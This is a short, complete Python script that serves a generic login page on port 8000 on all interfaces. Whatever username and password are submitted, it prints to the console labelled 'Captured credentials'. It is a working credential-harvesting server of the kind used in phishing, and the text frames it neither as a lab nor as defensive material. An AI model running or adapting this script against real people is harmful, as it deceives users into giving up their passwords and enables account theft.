from http.server import BaseHTTPRequestHandler, HTTPServer

class SimpleHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/":
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()

            html = """
            <html>
            <body>
            <h2>Login</h2>
            <form method="POST">
                Username: <input name="username"><br>
                Password: <input type="password" name="password"><br>
                <input type="submit">
            </form>
            </body>
            </html>
            """
            self.wfile.write(html.encode())

    def do_POST(self):
        length= int(self.headers['Content-length'])
        post_data = self.rfile.read(length)

        print("Captured credentials:", post_data.decode())

        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Login received")

server = HTTPServer(("0.0.0.0", 8000), SimpleHandler)
print("Server running on port 8000")
server.serve_forever()

